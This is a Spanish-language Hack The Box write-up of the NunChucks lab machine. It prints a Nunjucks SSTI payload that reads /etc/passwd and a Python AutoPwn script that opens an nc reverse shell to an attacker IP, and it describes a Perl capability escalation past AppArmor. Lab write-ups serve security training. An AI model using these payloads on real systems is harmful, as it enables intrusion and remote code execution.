---
title: NunChucks
layout: page
permalink: /HTB_NunChucks
---

<h2 class="amarillo">NunChucks</h2>
<div id="logos" style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/nunchucks.png" alt="under" oncontextmenu="return false;">
</div>

Encendemos la máquina NunChucks y obtenemos la dirección ip 10.129.95.252, probamos a lanzar 1 traza ICMP para comprobar si la máquina esta activa y de paso a través del TTL identificar si estamos frente a un sistema Linux o Windows.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/1.png" alt="under" oncontextmenu="return false;">
</div>

Vemos un TTL de 63, asi que estamos frente a un sistema Linux.

<h2 class="amarillo">Enumeración</h2>

Para la enumeración de puertos abiertos hacemos uso de la herramienta nmap `nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.129.95.252`
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/2.png" alt="under" oncontextmenu="return false;">
</div>
Y vemos únicamente 3 puertos abiertos, siendo estos el 22, 80 y 443.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/3.png" alt="under" oncontextmenu="return false;">
</div>
Vemos un dominio nunchucks.htb el cual agregamos al archivo /etc/hosts. De esta manera utilizando whatweb podremos ver las tecnologías que emplea la web y notar si aplica Virtual Hosting.

> El Virtual Hosting podemos verlo como la técnica para desplegar distintos sitios web a partir de la dirección ip o del dns.

<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/4.png" alt="under" oncontextmenu="return false;">
</div>
No hay diferencia entre las tecnologías por los puertos 80 y 443.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/5.png" alt="under" oncontextmenu="return false;">
</div>
Abrimos entonces la página web y nos aplica el redirect al dominio.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/6.png" alt="under" oncontextmenu="return false;">
</div>
Vemos que hay un apartado de registro, podemos probar registrarnos y capturar la petición con BurpSuite.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/7.png" alt="under" oncontextmenu="return false;">
</div>
Pero no logramos nada.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/8.png" alt="under" oncontextmenu="return false;">
</div>
Llegados a este punto podemos probar a enumerar dominios con la herramienta wfuzz haciendo uso de FUZZING.

<h2 class="amarillo">Fuzzing</h2>

Para enumerar subdominios con wfuzz haremos `wfuzz -c -t 200 --hc=404 --hh=30587 -w /usr/share/SecLists/Discovery/DNS/subdomains-top1million-5000.txt -H "Host: FUZZ.nunchucks.htb" https://nunchucks.htb` y encontramos un subdominio llamado store.nunchucks.htb

<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/9.png" alt="under" oncontextmenu="return false;">
</div>

Agregando el nuevo dominio al /etc/hosts vemos una web que nos permite ingresar nuestro correo para recibir notificaciones.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/10.png" alt="under" oncontextmenu="return false;">
</div>
Ingresamos un correo y capturamos la petición para saber que esta pasando por detrás.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/11.png" alt="under" oncontextmenu="return false;">
</div>
Y vemos que nos esta representado el correo ingresado por pantalla. Con esto tenemos la pista de que podría ser un SSTI.

<h2 class="amarillo">SSTI Server Side Template Injection</h2>

Para aprovecharnos podemos hacer uso de la instrucción `{{8*8}}`, si nos realiza la multiplicación y nos muestra el resultado por pantalla es un SSTI.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/12.png" alt="under" oncontextmenu="return false;">
</div>

> Esta vulnerabilidad ocurre cuando un agente de amenaza puede inyectar código malicioso en una plantilla del lado del servidor, causando así que el servidor ejecute código arbitrario. Esto se debe a que el código inyectado es interpretado por los Template Engines. Aquí hay un recurso muy interesante para indagar más al respecto https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/JavaScript.md

Más allá de JavaScript, Flask y Jinja2, existe un Nunjucks que se llama similar al nombre de la máquina.

A pesar de encontrarnos con un error al probar el SSTI vemos que nos reporta información interesante.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/13.png" alt="under" oncontextmenu="return false;">
</div>

Probamos con una lectura de archivos para leer el contenido del archivo /etc/passwd:
```jinja2
{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('tail /etc/passwd')\")()}}@gmail.com
```
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/14.png" alt="under" oncontextmenu="return false;">
</div>
De la misma forma, podemos tener un RCE para validar la existencia de binarios como nc.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/15.png" alt="under" oncontextmenu="return false;">
</div>
De esta forma podremos conectarnos a la máquina y leer la flag del usuario.

<h2 class="amarillo">Script AutoPwn</h2>

Utilizando python, comparto el script que he utilizado para crear una reverse shell y conectarnos como david.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/19.png" alt="under" oncontextmenu="return false;">
</div>

```python
#!/usr/bin/env python3
# Author: Juan Garcia aka liandd

import sys
import signal
from termcolor import colored
import requests
from pwn import *
import argparse
import threading


# Ctrl_C
def def_handler(sig, frame):
    print(colored("[!] Saliendo...", "red"))
    sys.exit(1)


# Ctrl_C
signal.signal(signal.SIGINT, def_handler)


def get_arguments():
    parser = argparse.ArgumentParser(description=colored(
        "AutoPwn NunChucks", "red")+colored(" HTB", "green")+" by "+colored("liandd", "red"))
    parser.add_argument('-u', '--url', dest="URL",
                        help="Machine URL to Pwn (i.e --url http://store.nunchucks.htb)")
    parser.add_argument('-i', '--ip', dest="IP",
                        help="IP address to get shell (i.e --IP 10.10.16.42)")
    parser.add_argument('-p', '--port', dest="PORT",
                        help="PORT to get shell (i.e --port 443)")

    options = parser.parse_args()
    if options.URL is None or options.IP is None or options.PORT is None:
        parser.print_help()
        print("\n\n")
        sys.exit(1)
    return options.URL, options.IP, options.PORT


def stti(URL, IP, PORT):
    main_url = URL+'/api/submit'
    data = {
        "email": "{{range.constructor(\"return global.process.mainModule.require('child_process').execSync('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc %s %s >/tmp/f')\")()}}@gmail.com" % (IP, PORT)}
    r = requests.post(main_url, data=data, verify=False)


def main():
    URL, IP, PORT = get_arguments()

    try:
        threading.Thread(target=stti, args=(URL, IP, PORT)).start()
    except Exception as e:
        print(colored(e, "red"))

    shell = listen(PORT, timeout=20).wait_for_connection()
    shell.interactive()


if __name__ == '__main__':
    main()
```

<h2 class="amarillo">Escalada</h2>

Tratando de encontrar archivos SUID con `find / -perm -4000 2>/dev/null` no vemos nada interesante, probamos a buscar por Capabilities y vemos que el binario /usr/bin/perl tiene la CAP_SETUID.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/16.png" alt="under" oncontextmenu="return false;">
</div>
Podemos crear un script en PERL para elevar el privilegio usando esta capability, esto se debe a que existe un AppArmor configurado y no podemos hacer el one liner de GTFobins con perl. Hay una persona que descubrió un bug en AppArmor con los shebangs, en donde, creando un script de bash pero con el shebang de perl le permite burlar completamente el AppArmor.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/17.png" alt="under" oncontextmenu="return false;">
</div>
La guardamos en /dev/shm y al ejecutarla seremos root.
<div style="text-align: center;">
  <img src="/assets/images/HTB/NunChucks/18.png" alt="under" oncontextmenu="return false;">
</div>


